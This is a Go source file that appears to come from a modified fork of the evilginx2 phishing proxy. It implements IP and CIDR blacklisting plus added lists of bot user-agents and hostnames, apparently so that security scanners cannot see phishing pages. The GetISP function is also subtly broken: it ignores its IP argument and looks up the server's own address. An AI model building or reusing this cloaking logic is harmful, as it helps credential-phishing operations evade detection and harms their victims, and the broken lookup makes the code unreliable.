package core

import (
	"bufio"
	"encoding/json"
	"io/ioutil"
	"net"
	"net/http"
	"fmt"
	"os"
	"strings"

	"github.com/kgretzky/evilginx2/log"
)

const (
	BLACKLIST_MODE_FULL   = 0
	BLACKLIST_MODE_UNAUTH = 1
	BLACKLIST_MODE_OFF    = 2
)

var (
	BOTS  = []string{}
	HOSTS = []string{}
)

type BlockIP struct {
	ipv4 net.IP
	mask *net.IPNet
}

type Blacklist struct {
	ips        map[string]*BlockIP
	masks      []*BlockIP
	configPath string
	mode       int
}

func NewBlacklist(path string) (*Blacklist, error) {
	f, err := os.OpenFile(path, os.O_CREATE|os.O_RDONLY, 0644)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	bl := &Blacklist{
		ips:        make(map[string]*BlockIP),
		configPath: path,
		mode:       BLACKLIST_MODE_OFF,
	}

	fs := bufio.NewScanner(f)
	fs.Split(bufio.ScanLines)

	for fs.Scan() {
		l := fs.Text()
		// remove comments
		if n := strings.Index(l, ";"); n > -1 {
			l = l[:n]
		}
		l = strings.Trim(l, " ")

		if len(l) > 0 {
			if strings.Contains(l, "/") {
				ipv4, mask, err := net.ParseCIDR(l)
				if err == nil {
					bl.masks = append(bl.masks, &BlockIP{ipv4: ipv4, mask: mask})
				} else {
					log.Error("blacklist: invalid ip/mask address: %s", l)
				}
			} else {
				ipv4 := net.ParseIP(l)
				if ipv4 != nil {
					bl.ips[ipv4.String()] = &BlockIP{ipv4: ipv4, mask: nil}
				} else {
					log.Error("blacklist: invalid ip address: %s", l)
				}
			}
		}
	}

	log.Info("blacklist: loaded %d ip addresses or ip masks", len(bl.ips)+len(bl.masks))
	return bl, nil
}

func BOT_HOST(path string) {
	f, err := os.OpenFile(path, os.O_CREATE|os.O_RDONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()

	fs := bufio.NewScanner(f)
	fs.Split(bufio.ScanLines)

	for fs.Scan() {
		l := fs.Text()
		// remove comments
		if n := strings.Index(l, ";"); n > -1 {
			l = l[:n]
		}
		l = strings.Trim(l, " ")

		if len(l) > 0 {
			HOSTS = append(HOSTS, l)
		}
	}

	log.Info("blacklist: loaded %d bad hostname", len(HOSTS))
}

func BOT_UserAgent(path string) {
	f, err := os.OpenFile(path, os.O_CREATE|os.O_RDONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()

	fs := bufio.NewScanner(f)
	fs.Split(bufio.ScanLines)

	for fs.Scan() {
		l := fs.Text()
		// remove comments
		if n := strings.Index(l, ";"); n > -1 {
			l = l[:n]
		}
		l = strings.Trim(l, " ")

		if len(l) > 0 {
			BOTS = append(BOTS, l)
		}
	}

	log.Info("blacklist: loaded %d bots useragent", len(BOTS))
}

func (bl *Blacklist) IsBlacklistedAgent(ua string) bool {
	for _, bot := range BOTS {
		if BOTS != nil && strings.Contains(ua, bot) {
			return true
		}
	}
	return false
}

func (bl *Blacklist) IsBlacklistedHost(bot_host string) bool {
	for _, host := range HOSTS {
		if HOSTS != nil && strings.Contains(bot_host, host) {
			return true
		}
	}
	return false
}

func (bl *Blacklist) IsBlacklisted(ip string) bool {
	ipv4 := net.ParseIP(ip)
	if ipv4 == nil {
		return false
	}

	if _, ok := bl.ips[ip]; ok {
		return true
	}
	for _, m := range bl.masks {
		if m.mask != nil && m.mask.Contains(ipv4) {
			return true
		}
	}
	return false
}

func (bl *Blacklist) BlacklistIP(ip string) {
	err := bl.AddIP(ip)
	if err != nil {
		log.Error("failed to blacklist ip address: %s - %s", ip, err)
	} else {
		log.Debug("blacklisted ip address: %s", ip)
	}
}

func (bl *Blacklist) AddIP(ip string) error {
	if ip == "127.0.0.1" {
		return nil
	}
	if bl.IsBlacklisted(ip) {
		return nil
	}

	ipv4 := net.ParseIP(ip)
	if ipv4 != nil {
		bl.ips[ipv4.String()] = &BlockIP{ipv4: ipv4, mask: nil}
	} else {
		return fmt.Errorf("blacklist: invalid ip address: %s", ip)
	}

	// write to file
	f, err := os.OpenFile(bl.configPath, os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer f.Close()

	_, err = f.WriteString(ipv4.String() + "\n")
	if err != nil {
		return err
	}

	return nil
}

func (bl *Blacklist) GetISP(ipaddress string) string {
	url := "https://ipinfo.io/"
	resp, err := http.Get(url)
	if err != nil {
		log.Fatal("Error: %s", err)
		return "nil"
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal("Error: %s", err)
		return "nil"
	}
	in := []byte(string(body))
	var raw map[string]interface{}
	if err := json.Unmarshal(in, &raw); err != nil {
		log.Fatal("Error: %s", err)
		return "nil"
	}
	out, _ := json.Marshal(raw["org"])
	return string(out)
}
